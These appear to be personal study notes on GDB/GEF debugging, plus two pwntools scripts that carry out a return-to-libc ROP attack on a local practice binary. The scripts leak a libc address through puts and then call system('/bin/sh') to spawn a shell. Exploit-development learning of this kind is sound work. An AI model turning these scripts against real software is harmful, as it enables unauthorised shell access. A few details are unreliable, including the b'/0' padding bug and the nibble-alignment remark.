# GDB/GEF Notes & Techniques

**<u>Getting symbols of table</u>**

```bash
readelf -s ./libc.so.6
```



**<u>Setting Breakpoints:</u>**

```bash
gef➤ b main
Breakpoint 1 at 0xa45c: file gitGrabber.cpp, line 239.
gef➤ run

#generally want to break at the RET at the bottom of a functions
gef➤ disassemble function_name
gef➤ b *0xret_instr_at_bottom_of_function
gef➤ c
```



**<u>Calling Functions:</u>**

```bash
gef➤  call function_name(0x12)
$2 = 0x7f43678f69b4 "3)\302\021\277\023\016\221\222\254'\343\271\323.\200b\252\203voM\a.ڼT\bjWKs"

#hexdumping 
gef➤  hexdump byte 0x7f43678f69b4 --size 32
0x00007f43678f69b4     33 29 c2 11 bf 13 0e 91 92 ac 27 e3 b9 d3 2e 80    3)........'.....
0x00007f43678f69c4     62 aa 83 76 6f 4d 07 2e da bc 54 08 6a 57 4b 73    b..voM....T.jWKs
```



**<u>Inspecting</u>**

```bash
#x for examine, g for 8 bytes, x for hex
gef➤ x/gx $rsp

#examine for string
gef➤ x/s 0xaddress

#printing function addr
gef➤ p system
gef➤ p puts

#check memory map
gef➤ vm

#seeing more instructions
gef➤ telescope 0xaddress 64

#searching for address
gef➤ grep /bin/sh
```



**<u>Pattern</u>**

```bash
gef➤ pattern create 200
gef➤ pattern offset $rsp
```





### Return to LIBC Rop Chain

RELRO = Global offset table is read and writable

NX enabled = can't just execute shellcode

No PIE = ASLR won't affect base address

```python
#!/usr/bin/env python3

from pwn import *

p = process("./vuln")
gdb.attach(p)

offset = 136
junk = b"A" * offset

"""
Plan of attack:
1. Use puts to leak to an address
2. Supply argument to puts
3. Use x64 calling conventions, which means rdi is first argument
4. After the lea, we can calculate offset between the function that was leaked and the function we want

"""

#found using ropgadget command
pop_rdi = 0xaddress
#found by going into the .got.plt in ghidra and finding setbuf
setbuf_at_got = 0xaddress
#found by going into the .plt to find puts
puts_at_plt = 0xaddress
#found in ghidra memory
back_to_main = 0xaddress

payload = [
    junk,
    #call puts to display/leak the true setbuf address
    p64(pop_rdi),
    p64(setbuf_at_got),
    p64(puts_at_plt),
    #jump back to safe place so we don't crash
    p64(back_to_main),
    
]

payload = b"".join(payload)
p.sendline(payload)

#store response of leak
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

#readelf -s libc.so.6 | grep -i setbuf
setbuf_offset = 0xaddress
base_address_of_libc = leak - setbuf_offset
log.info(f"{hex(base_address_of_libc)=}")

#readelf -s libc.so.6 | grep system
system_offset = 0xaddress
system_address = base_address_of_libc + system_offset

#gef➤ grep /bin/sh, take that first address
#gef➤ vm, grab starting address of libc.so.6
#gef➤ p 0xgrep_address - 0xstarting_addr
bin_sh_offset = 0xaddress
bin_sh_address = base_address_of_libc + bin_sh_offset

#ROPgadget --binary vuln | grep ": ret"
ret_instr = 0xaddr

second_payload = [
    
    junk,
    p64(pop_rdi),
    p64(bin_sh_address),
    #needed for stack alignment, stack ptr's last hex digit must be 0, ret will pop from stack and make it 0, movdqu instruction with xxm registers will need alignment
    p64(ret_instr),
    p64(system_address),
    
]

second_payload = b"".join(second_payload)
p.sendline(second_payload)

p.interactive()
```

Last 4 nibbles need to be 0 for a libc address leak



### Using pwntools

```bash
#first fix and link the binary
#check with ldd
ldd vuln
#get this from github and run in directory with the binary and libc file
$ pwninit

#links to the generated linked
patchelf --set-interpreter ./ld-2.27.so ./vuln

```



```python
#!/usr/bin/env python3

from pwn import *

context.binary = binary = './vuln'

vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')
vuln_rop = ROP(vuln_elf)
p = process('./vuln')

padding = b'A'*136

payload = padding

#returns list of all matching gadgets, just take first 1
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.got.setbuf)
payload += p64(vuln_elf.plt.puts)
payload += p64(vuln_elf.symbols.main)

p.sendlineafter('text that you want the payload to send after', payload)
p.recvuntil('text that shows up before the leak\n')

leak = u64(p.recvline().strip().ljust(8, b'/0'))
log.info(f'{hex(leak)}')

libc.address = leak - libc.symbols.setbuf
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)

p.interactive()

```



